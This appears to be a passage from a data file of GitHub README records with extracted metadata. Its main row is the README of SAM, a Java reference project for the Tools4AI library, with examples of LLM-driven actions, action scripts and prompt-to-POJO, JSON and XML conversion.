- [千帆大模型平台](https://console.bce.baidu.com/qianfan/overview)",1,0,1,apache-2.0,0.0,"['java', 'sdk', 'key', 'pluginapptestcase', 'queryscorefunction', 'computeavgscorefunction']","['java', 'sdk', 'key', 'pluginapptestcase', 'queryscorefunction']",19,0,0,"['java', 'sdk']",16,"['java', 'sdk']",12,10.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0,25438,116.33333333333331,6.242478510028653,"['License -> https://img.shields.io/badge/License-Apache_2.0-green.svg', 'JDK17+ -> https://img.shields.io/badge/JDK-17+-blue.svg', 'LLM-文心一言 -> https://img.shields.io/badge/LLM-%E6%96%87%E5%BF%83%E4%B8%80%E8%A8%80-blue.svg', '百度智能云 -> https://cloud.baidu.com/', '创建一个应用 -> https://console.bce.baidu.com/qianfan/ais/console/applicationConsole/application', 'PluginAppTestCase -> https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/pluginapp/PluginAppTestCase.java', 'QueryScoreFunction -> https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/QueryScoreFunction.java', 'ComputeAvgScoreFunction -> https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/ComputeAvgScoreFunction.java', '文生图-猫 -> https://ompc-images.oss-cn-hangzhou.aliyuncs.com/erniebot4j/gen-image-as-mr0hyfmsix-001.png', '千帆大模型平台 -> https://console.bce.baidu.com/qianfan/overview', 'compute_avg_score', 'query_score', 'compute_avg_score', 'query_score', 'compute_avg_score', 'query_score', 'compute_avg_score', 'compute_avg_score', 'compute_avg_score', 'query_score', 'compute_avg_score', 'compute_avg_score', 'compute_avg_score', 'compute_avg_score']",24
vishalmysore/sam,main,"<div align=""center"">
  <a href=""https://www.linkedin.com/posts/vishalrow_ai-appdevelopment-actions-activity-7171302152101900288-64qg?utm_source=share&utm_medium=member_desktop"">
    <img src=""tools4ai.png""  width=""300"" height=""300"">
  </a>
</div>
<p align=""center"">
    <img  src=""https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fvishalmysore%2Ftools4ai&countColor=black&style=flat%22"">
    <a target=""_blank"" href=""https://github.com/vishalmyore/tools4ai""><img src=""https://img.shields.io/github/stars/vishalmysore/tools4ai?color=black"" /></a>
    <a target=""_blank"" href=""https://github.com/vishalmysore/sam/actions/workflows/maven.yml""><img src=""https://github.com/vishalmysore/sam/actions/workflows/maven.yml/badge.svg"" /></a>  
</p>

# 🎬 Simple Action Model - SAM

SAM is a reference implementation of Tool4AI project  https://github.com/vishalmysore/Tools4AI
Basically showcasing how straight forward it is to build action oriented applications in 100% Java. In addition to action model
SAM can be used as an autonomous agent by utilizing action scripts which are a specialized form of these intelligent systems, designed specifically for enterprise AI 
applications. While retaining the core capabilities of autonomy and adaptability, scripts can operates within
a controlled framework, executing tasks and making decisions that align with predefined business rules and 
objectives 

## Features and Articles
- **Action Processor**: Execute actions based on prompt (OpenAI, Gemini, Anthropic) [here](https://www.linkedin.com/pulse/large-action-model-gemini-java-vishal-mysore-qki8c?trackingId=MuqKH2YZNwe74wisqhMSuw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Image Processor**: Trigger actions based on images [here](https://www.linkedin.com/pulse/image-recognition-function-calling-gemini-java-vishal-mysore-sz5zc?trackingId=lpJITsmYD0XPgdaG676jmA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Autonomous Agent**: Execute tasks based on scripts [here](https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc?trackingId=qE91gQ%2Bngtn4vI45pxJEgg%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Image to Text**: Convert images to text[here](https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Image to Pojo**: Convert images to Pojo [here](https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Image to Json**: Convert images to Json [here](https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Image to XML**: Convert images to XML[here](https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Selenium Actions**: Execute actions based on Selenium script [here](https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc/?trackingId=r0XIS0PtQZWrCqbgZwLbww%3D%3D)
- **Spring Integration**: Integrate with Spring Boot [here](https://www.linkedin.com/pulse/spring-action-integrating-ai-applications-vishal-mysore-ogjkc?trackingId=qsUWss8mwUVYSijqTD1SRA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Script Processor**: Execute tasks based on scripts [here](https://www.linkedin.com/pulse/action-all-you-need-moving-beyond-conversation-ai-vishal-mysore-sukfc?trackingId=XieWREfuTm3Lsb4uZkpAdw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Http Actions**: Execute actions based on HTTP requests [here](https://www.linkedin.com/pulse/http-endpoints-large-action-model-complete-ai-vishal-mysore-vhhmc?trackingId=Lht%2FqIlOATU5k3j8pznjKA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Prompt Processor**: Execute tasks based on prompts [here](https://www.linkedin.com/pulse/advanced-prompt-processing-java-parallel-data-more-vishal-mysore-7gtoc?trackingId=VNYgjVXcGDpkWkLNz0JPow%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Prompt Transformer**: Convert prompts into various formats ( Java , Json , XML) [here](https://www.linkedin.com/pulse/sam-simple-action-model-java-vishal-mysore-nmwec?trackingId=wFNZtf8A30JnMvWUjJhfiA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Custom GSON**: Convert special values in prompts [here](https://www.linkedin.com/pulse/large-action-model-gemini-java-vishal-mysore-qki8c?trackingId=MuqKH2YZNwe74wisqhMSuw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Subprompt Processing**: Break prompts into multiple subprompts [here](https://www.linkedin.com/pulse/building-autonomous-ai-agent-java-action-scripts-vishal-mysore-p3mbf?trackingId=Y6X67pUWoycIGQHaYexn9w%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Human In Loop Validation** [here](https://www.linkedin.com/pulse/ai-development-java-gemini-vishal-mysore-7puqc?trackingId=VUqUIPcf%2BLLOR5z1kOYWwA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Explainablity** [here](https://www.linkedin.com/pulse/enhancing-ai-decision-making-multi-ai-voting-mechanism-vishal-mysore-qlpxc?trackingId=NQ4m7eoWn97yJ50C7iBcMw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Kubernets Integration** [here]( [here](https://www.linkedin.com/pulse/kubernetes-management-ai-using-tools4ai-vishal-mysore-d4jxc?trackingId=sBUyZg%2BykR9dTx%2FTwineiQ%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D)
- **Multi Command Processor** [here](https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc?trackingId=074SlSqIoJkEJFEkOC98QA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3B68UQVWs4SiW1kIcA14PsKg%3D%3D)
- **Hallucination Detector** [here](https://www.linkedin.com/pulse/detect-ai-hallucinations-rag-routing-branching-chaining-vishal-mysore-jrzic)
- **Bias Detector** [here](https://www.linkedin.com/pulse/ai-bias-what-does-mean-vishal-mysore-0atsc)
- **Database Actions**
- **Tibco Actions**
- **Custom Actions**
- **Custom HTTP Actions**
- **Custom Shell Actions**
- **Custom Swagger Actions**
- **Custom OpenAI Actions**
- **Custom Selenium Actions**
- 

## Setup
Clone this project and then  

```mvn clean install```

## Action Processor
Action Processors are responsible for taking actions based on prompt. Actions can be written in Java Methods, Or could be 
HTTP rest end points , could be Shell scripts or could be loaded directly from the Swagger HTTP configurations.
Inside ```Main.java``` these 2 lines will predict the action and execute it using Gemini , you dont have to worry
about specifying the action, the action will be picked up based on Natural Language Processing semantic mapping
and will be executed. 

```
String cookPromptSingleText = ""My friends name is Vishal ,"" +
                ""I dont know what to cook for him today."";
GeminiActionProcessor processor = new GeminiActionProcessor();
String result = (String)processor.processSingleAction(cookPromptSingleText);
log.info(result);
```

This code will use OpenAI to predict the action and execute it 

```
OpenAiActionProcessor opeAIprocessor = new OpenAiActionProcessor();
Sring result = (String)opeAIprocessor.processSingleAction('My friends name is Vishal ,he lives in tornto.I want save this info locally');
System.out.println(result);

```

Create custom action by using @Predict annotation and @Action annotation. Parameters of the method can be 
anything and any number of parameters are allowed You need to make sure parameters have meaningful name. 

```
@Predict
public class SimpleAction {

    @Action(description = ""Provide persons name and then find out what does that person like"")
    public String whatFoodDoesThisPersonLike(String name) {
        if(""vishal"".equalsIgnoreCase(name))
        return ""Paneer Butter Masala"";
        else if (""vinod"".equalsIgnoreCase(name)) {
            return ""aloo kofta"";
        }else
            return ""something yummy"";
    }

}
```
or
```
@Log
@Predict
public class SearchAction  {

    @Action(description = ""Search the web for information"")
    public String googleSearch(String searchString, boolean isNews)  {
        log.info(searchString+"" : ""+isNews);
        HttpResponse<String> response = Unirest.post(""https://google.serper.dev/search"")
                .header(""X-API-KEY"", PredictionLoader.getInstance().getSerperKey())
                .header(""Content-Type"", ""application/json"")
                .body(""{\""q\"":\""""+searchString+""\""}"")
                .asString();
        String resStr = response.getBody().toString();
        return resStr;
    }




}
```

Or add actions in Shell or HTTP config files  

## Image Processing and Actions
Trigger actions based directly on images! Yes, you read that right – with the power of Java, we can now integrate function calling with image inputs.

Imagine a system so advanced that it can:

🚑 Call an ambulance immediately after detecting an image of a car accident.  
🍳 Suggest recipes the moment it sees images of vegetables.  
👮 Alert the police when it captures an image of a traffic signal violation.  
🚒 Contacts the fire department immediately if it ""sees"" fire.  


```
public class ImageActionExample {
public static void main(String[] args) throws AIProcessingException {
GeminiImageActionProcessor processor = new GeminiImageActionProcessor();
String imageDisription = processor.imageToText(args[0]);
GeminiV2ActionProcessor actionProcessor = new GeminiV2ActionProcessor();
Object obj = actionProcessor.processSingleAction(imageDisription);
String str  = actionProcessor.summarize(imageDisription+obj.toString());
System.out.println(str);
}
}
```


## Autonomous Agent (Action Script)

If you have a complete script written in English , ScriptProcessor will process the script and provide consolidated results

```
 ScriptProcessor script = new ScriptProcessor();
 ScriptResult result =  script.process(""complexTest.action"");
 String resultsString = script.summarize(result)
 log.info(resultsString)

```

Sample script is here 

``` 
can you reserve the flight for Vishal from Toronto to Bangalore for 3 Days on 7th december
If flight booking is successful, can you reserve the car for Vishal from Bangalore to Toronto for 10 Days on 17th december
if car booking is successful and flight cost are less than $1000 then book the sight seeing attraction called 5 star palace
if car booking is successful and flight cost are more than $1000 then book the sight seeing attraction called peanut palace
```

You can add Human In Loop validation , Explainablity , Multi Command Processor, Hallucination Detector , Bias Detector , Database and Tibco actions as well
please look at https://github.com/vishalmysore/Tools4AI for more information

## Prompt Transformer

Prompt Transformer, a core feature in the Tools4AI project, simplifies data transformation tasks. It effortlessly converts prompts into various formats like Java POJOs, JSON strings, CSV files, and XML. By enabling direct conversion of prompts into domain-specific objects, Prompt Transformer streamlines data processing tasks. It offers flexibility and ease of use for transforming data structures to meet diverse needs in modern applications.

### Convert Prompt to Simple Pojo

Lets take the first scenario where you want to conver the prompt directly into Java Bean or Pojo

```  
PromptTransformer builder = new PromptTransformer();
String promptTxt =""Sachin Tendulkar is very good cricket player, "" +
                           ""he joined the sports on 24032022, he has played 300 matches "" +
                           ""and his max score is 400"";
//Convert the prompt to Pojo
Player player = (Player)builder.transformIntoPojo(promptTxt, Player.class.getName(),""Player"",""create player pojo"");
log.info(player.toString());
```

The above will convert the prompt into this simple Pojo 
```
import lombok.*;
import lombok.extern.java.Log;

import java.util.Date;

@NoArgsConstructor
@AllArgsConstructor
@Getter
@Setter
@EqualsAndHashCode
@ToString
public class Player {
     int matches;
     int maxScore;
     String firstName;
     String lastName;
     Date dateJoined;


}
 
```
### Convert Prompt to Complex Pojo

The transformer can also convert into complex Pojo ( where there are multiple objects inside the Pojo)

```
PromptTransformer builder = new PromptTransformer();
promptTxt = ""can you book Maharaja restaurant in "" +
            ""Toronto for 4 people on 12th may , I am Vishal "";
//Convert the prompt to Complex Pojo
RestaurantPojo pojo = (RestaurantPojo)builder.transformIntoPojo(promptTxt, RestaurantPojo.class.getName(),""RestaurantPojo"",""Build the pojo for restaurant"");
log.info(pojo.toString()); 
```

This will create the Pojo Object of RestaurantPojo and also populate the internal objects ( not just primitive)
```
public class RestaurantPojo {
    String name;
    int numberOfPeople;
    //Pojo inside Pojo    
    RestaurantDetails restaurantDetails;
    boolean cancel;
    String reserveDate; 
```
### Convert Prompt with Custom GSON

If you expect some custom objects like Date etc in the prompt you can have custom Gson Builder

```
//Using Custom GSON to convert special values
GsonBuilder gsonBuilder = new GsonBuilder();
gsonBuilder.registerTypeAdapter(Date.class, new DateDeserializer(""dd MMMM yyyy""));
Gson gson = gsonBuilder.create();
PromptTransformer customBuilder = new PromptTransformer(gson);
String prompt = ""Sachin Tendulkar is very good cricket player, he joined the sports on 12 May 2008,"" +
                ""he has played 300 matches and his max score is 400"";
player = (Player)customBuilder.transformIntoPojo(prompt, Player.class.getName(),""Player"",""create player pojo"");
log.info(player.toString()); 
```
This will use Custom Date Serializer 

```
public class DateDeserializer implements JsonDeserializer<Date> {
    private final DateFormat dateFormat;

    public DateDeserializer(String format) {
        this.dateFormat = new SimpleDateFormat(format, Locale.ENGLISH);
    }

    @Override
    public Date deserialize(JsonElement json, Type typeOfT, JsonDeserializationContext context) throws JsonParseException {
        try {
            return dateFormat.parse(json.getAsString().replaceAll(""(st|nd|rd|th),"", "",""));
        } catch (ParseException e) {
            throw new JsonParseException(e);
        }
    }
} 
```

### Convert Prompt to Json String
If you want to convert the Prompt into the Json String 
``` 
 prompt = ""Sachin Tendulkar is very good cricket player, he joined the sports on 12 May 2008,"" +
                ""he has played 300 matches and his max score is 400"";
 //Extract Json from the prompt
 String jsonString = ""{\""lastName\"":\""String\"",\""firstName\"":\""String\""}"";
 jsonString = builder.transformIntoJson(jsonString,prompt,""player"",""get player details"");
 log.info(jsonString);
```

The result will be 

```
""{\""lastName\"":\""Tendulkar\"",\""firstName\"":\""Sachin\""}""; 
```
You can extract custom parameters from the prompt or can convert the entire prompt into JSON

### Convert Prompt to XML
Once you have the JSON you can convert the JSON into XML

```
JSONObject jsonObject = new JSONObject(jsonNode.toString());
String xmlString = XML.toString(jsonObject); 
```

### Break Prompt into Multiple Subprompts and take action

You can have a really long prompt with multiple actions , those prompts will be broken down in multiple subprompts
``` 
@Log
public class ActionExample {
    public static void main(String[] args) throws AIProcessingException {
        ActionProcessor processor = new ActionProcessor();
        String multiPrmpt = ""hey I am in Toronto do you think i can go out without jacket,"" +
                "" also save the weather information , City location and your suggestion in file, "" +
                ""also include places to see"";
        String processed = processor.processMultipleActionDynamically
                (multiPrmpt, 
                        new LoggingHumanDecision(),
                        new LogginggExplainDecision());
        log.info(processed);
    }
}
```
Tools4AI will create a JSon from the prompt

```
{
  ""prmpt"": [
    {
      ""id"": ""1"",
      ""subprompt"": ""What is the weather in Toronto?"",
      ""depend_on"": null
    },
    {
      ""id"": ""2"",
      ""subprompt"": ""Do I need a jacket in this weather?"",
      ""depend_on"": ""1""
    },
    {
      ""id"": ""3"",
      ""subprompt"": ""Save the weather information, city location, and suggestion in a file."",
      ""depend_on"": ""2""
    },
    {
      ""id"": ""4"",
      ""subprompt"": ""Suggest some places to see in Toronto."",
      ""depend_on"": ""3""
    }
  ]
}

```
After that each Subprompt will be processd independently or in dependency order, if the prompts are dependent on each other
then the result from previous prompt will be fed into the next one.



## Java Doc
https://javadoc.io/doc/io.github.vishalmysore/tools4ai/latest/com/t4a/api/AIAction.html

## MVN Dependency

https://repo1.maven.org/maven2/io/github/vishalmysore/tools4ai/",0,1,1,mit,0.0,"['simple', 'action', 'model', 'sam', 'sam', 'reference', 'implementation', 'project', 'http', 'basically', 'showcasing', 'straight', 'forward', 'build', 'action', 'oriented', 'application', 'java', 'addition', 'action', 'model', 'sam', 'used', 'autonomous', 'agent', 'utilizing', 'action', 'script', 'specialized', 'form', 'intelligent', 'system', 'designed', 'specifically', 'enterprise', 'ai', 'application', 'retaining', 'core', 'capability', 'autonomy', 'adaptability', 'script', 'operates', 'within', 'controlled', 'framework', 'executing', 'task', 'making', 'decision', 'align', 'predefined', 'business', 'rule', 'objective', 'feature', 'article', 'action', 'processor', 'execute', 'action', 'based', 'prompt', 'openai', 'gemini', 'anthropic', 'image', 'processor', 'trigger', 'action', 'based', 'image', 'autonomous', 'agent', 'execute', 'task', 'based', 'script', 'image', 'text', 'convert', 'image', 'text', 'image', 'pojo', 'convert', 'image', 'pojo', 'image', 'json', 'convert', 'image', 'json', 'image', 'xml', 'convert', 'image', 'xml', 'selenium', 'action', 'execute', 'action', 'based', 'selenium', 'script', 'spring', 'integration', 'integrate', 'spring', 'boot', 'script', 'processor', 'execute', 'task', 'based', 'script', 'http', 'action', 'execute', 'action', 'based', 'http', 'request', 'prompt', 'processor', 'execute', 'task', 'based', 'prompt', 'prompt', 'transformer', 'convert', 'prompt', 'various', 'format', 'java', 'json', 'xml', 'custom', 'gson', 'convert', 'special', 'value', 'prompt', 'subprompt', 'processing', 'break', 'prompt', 'multiple', 'subprompts', 'human', 'loop', 'validation', 'explainablity', 'kubernets', 'integration', 'multi', 'command', 'processor', 'hallucination', 'detector', 'bias', 'detector', 'database', 'action', 'tibco', 'action', 'custom', 'action', 'custom', 'http', 'action', 'custom', 'shell', 'action', 'custom', 'swagger', 'action', 'custom', 'openai', 'action', 'custom', 'selenium', 'action', 'setup', 'clone', 'project', 'action', 'processor', 'action', 'processor', 'responsible', 'taking', 'action', 'based', 'prompt', 'action', 'written', 'java', 'method', 'could', 'http', 'rest', 'end', 'point', 'could', 'shell', 'script', 'could', 'loaded', 'directly', 'swagger', 'http', 'configuration', 'inside', 'line', 'predict', 'action', 'execute', 'using', 'gemini', 'dont', 'worry', 'specifying', 'action', 'action', 'picked', 'based', 'natural', 'language', 'processing', 'semantic', 'mapping', 'executed', 'code', 'use', 'openai', 'predict', 'action', 'execute', 'create', 'custom', 'action', 'using', 'predict', 'annotation', 'action', 'annotation', 'parameter', 'method', 'anything', 'number', 'parameter', 'allowed', 'need', 'make', 'sure', 'parameter', 'meaningful', 'name', 'add', 'action', 'shell', 'http', 'config', 'file', 'image', 'processing', 'action', 'trigger', 'action', 'based', 'directly', 'image', 'yes', 'read', 'right', 'power', 'java', 'integrate', 'function', 'calling', 'image', 'input', 'imagine', 'system', 'advanced', 'call', 'ambulance', 'immediately', 'detecting', 'image', 'car', 'accident', 'suggest', 'recipe', 'moment', 'see', 'image', 'vegetable', 'alert', 'police', 'capture', 'image', 'traffic', 'signal', 'violation', 'contact', 'fire', 'department', 'immediately', 'see', 'fire', 'autonomous', 'agent', 'action', 'script', 'complete', 'script', 'written', 'english', 'scriptprocessor', 'process', 'script', 'provide', 'consolidated', 'result', 'sample', 'script', 'add', 'human', 'loop', 'validation', 'explainablity', 'multi', 'command', 'processor', 'hallucination', 'detector', 'bias', 'detector', 'database', 'tibco', 'action', 'well', 'please', 'look', 'http', 'information', 'prompt', 'transformer', 'prompt', 'transformer', 'core', 'feature', 'project', 'simplifies', 'data', 'transformation', 'task', 'effortlessly', 'convert', 'prompt', 'various', 'format', 'like', 'java', 'pojos', 'json', 'string', 'csv', 'file', 'xml', 'enabling', 'direct', 'conversion', 'prompt', 'object', 'prompt', 'transformer', 'streamlines', 'data', 'processing', 'task', 'offer', 'flexibility', 'ease', 'use', 'transforming', 'data', 'structure', 'meet', 'diverse', 'need', 'modern', 'application', 'convert', 'prompt', 'simple', 'pojo', 'let', 'take', 'first', 'scenario', 'want', 'conver', 'prompt', 'directly', 'java', 'bean', 'pojo', 'convert', 'prompt', 'simple', 'pojo', 'convert', 'prompt', 'complex', 'pojo', 'transformer', 'also', 'convert', 'complex', 'pojo', 'multiple', 'object', 'inside', 'pojo', 'create', 'pojo', 'object', 'restaurantpojo', 'also', 'populate', 'internal', 'object', 'primitive', 'convert', 'prompt', 'custom', 'gson', 'expect', 'custom', 'object', 'like', 'date', 'etc', 'prompt', 'custom', 'gson', 'builder', 'use', 'custom', 'date', 'serializer', 'convert', 'prompt', 'json', 'string', 'want', 'convert', 'prompt', 'json', 'string', 'result', 'extract', 'custom', 'parameter', 'prompt', 'convert', 'entire', 'prompt', 'json', 'convert', 'prompt', 'xml', 'json', 'convert', 'json', 'xml', 'break', 'prompt', 'multiple', 'subprompts', 'take', 'action', 'really', 'long', 'prompt', 'multiple', 'action', 'prompt', 'broken', 'multiple', 'subprompts', 'create', 'json', 'prompt', 'subprompt', 'processd', 'independently', 'dependency', 'order', 'prompt', 'dependent', 'result', 'previous', 'prompt', 'fed', 'next', 'one', 'java', 'doc', 'http', 'mvn', 'dependency', 'http']","['action', 'prompt', 'convert', 'image', 'custom']",2,1,0,"['simple', 'action', 'model', 'sam', 'feature', 'article', 'setup', 'action', 'processor', 'image', 'processing', 'action', 'autonomous', 'agent', 'action', 'script', 'prompt', 'transformer', 'convert', 'prompt', 'simple', 'pojo', 'convert', 'prompt', 'complex', 'pojo', 'convert', 'prompt', 'custom', 'gson', 'convert', 'prompt', 'json', 'string', 'convert', 'prompt', 'xml', 'break', 'prompt', 'multiple', 'subprompts', 'take', 'action', 'java', 'doc', 'mvn', 'dependency']",15,"['prompt', 'action', 'convert', 'simple', 'pojo']",20,0.0,1.0,"[maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.codehaus.mojo:exec-maven-plugin]",0.0,1.0,0.0,18437,89.24,6.311519497982967,"['here -> https://www.linkedin.com/pulse/large-action-model-gemini-java-vishal-mysore-qki8c?trackingId=MuqKH2YZNwe74wisqhMSuw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/image-recognition-function-calling-gemini-java-vishal-mysore-sz5zc?trackingId=lpJITsmYD0XPgdaG676jmA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/enterprise-ai-hub-llm-agent-built-openai-java-vishal-mysore-0p7oc?trackingId=qE91gQ%2Bngtn4vI45pxJEgg%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc?trackingId=8N9y2fCuYRDzmju9dREwVw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/selenium-ai-automation-image-processing-gemini-vishal-mysore-fihwc/?trackingId=r0XIS0PtQZWrCqbgZwLbww%3D%3D', 'here -> https://www.linkedin.com/pulse/spring-action-integrating-ai-applications-vishal-mysore-ogjkc?trackingId=qsUWss8mwUVYSijqTD1SRA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/action-all-you-need-moving-beyond-conversation-ai-vishal-mysore-sukfc?trackingId=XieWREfuTm3Lsb4uZkpAdw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/http-endpoints-large-action-model-complete-ai-vishal-mysore-vhhmc?trackingId=Lht%2FqIlOATU5k3j8pznjKA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/advanced-prompt-processing-java-parallel-data-more-vishal-mysore-7gtoc?trackingId=VNYgjVXcGDpkWkLNz0JPow%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/sam-simple-action-model-java-vishal-mysore-nmwec?trackingId=wFNZtf8A30JnMvWUjJhfiA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/large-action-model-gemini-java-vishal-mysore-qki8c?trackingId=MuqKH2YZNwe74wisqhMSuw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/building-autonomous-ai-agent-java-action-scripts-vishal-mysore-p3mbf?trackingId=Y6X67pUWoycIGQHaYexn9w%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/ai-development-java-gemini-vishal-mysore-7puqc?trackingId=VUqUIPcf%2BLLOR5z1kOYWwA%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> https://www.linkedin.com/pulse/enhancing-ai-decision-making-multi-ai-voting-mechanism-vishal-mysore-qlpxc?trackingId=NQ4m7eoWn97yJ50C7iBcMw%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here]( [here -> https://www.linkedin.com/pulse/kubernetes-management-ai-using-tools4ai-vishal-mysore-d4jxc?trackingId=sBUyZg%2BykR9dTx%2FTwineiQ%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_recent_activity_content_view%3Basc8boqLRvqWpXTf9SUEpA%3D%3D', 'here -> 